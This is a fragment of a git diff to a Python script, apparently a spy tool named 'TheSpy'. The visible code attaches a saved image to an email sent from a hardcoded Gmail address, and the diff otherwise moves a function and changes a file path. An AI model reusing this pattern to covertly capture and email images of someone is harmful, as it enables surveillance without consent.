@@ -10,19 +10,22 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import threading
-def start_time():
+
 rnum=random.randrange(20,100,1)
 imgname="TheSpy"+str(rnum)+".png"
+
+def start_time():
+        time.sleep(3)
+        print(" Yess ")
+
+
 
 if __name__ == "__main__":
     t1 = threading.Thread(target=start_time)
     t1.start()
-    
+
     t1.join()
-    
-def start_time():
-	time.sleep(3)
-	print(" Yess ")
+
 
 def mailme(imgname):
 	fromaddr = "kattademane@gmail.com"
@@ -36,7 +39,7 @@ def mailme(imgname):
 
 	msg.attach(MIMEText(body, 'plain'))
 	filename = "THeSpy"
-	location="/home/karmic/Desktop/Security/"+imgname
+	location="/home/samsung/Downloads/Security-20180908T165700Z-001/ComputerSecurity/"+imgname
 	attachment = open(location, "rb")
 	p = MIMEBase('application', 'octet-stream')
 	p.set_payload((attachment).read())
@@ -64,7 +67,7 @@ def goDude():
 		time.sleep(1)
 		cmd="mv "+imgname+" continue1"+str(rnum)
 		os.system(cmd)
-		
+
 		exit()
 
 def on_closing():
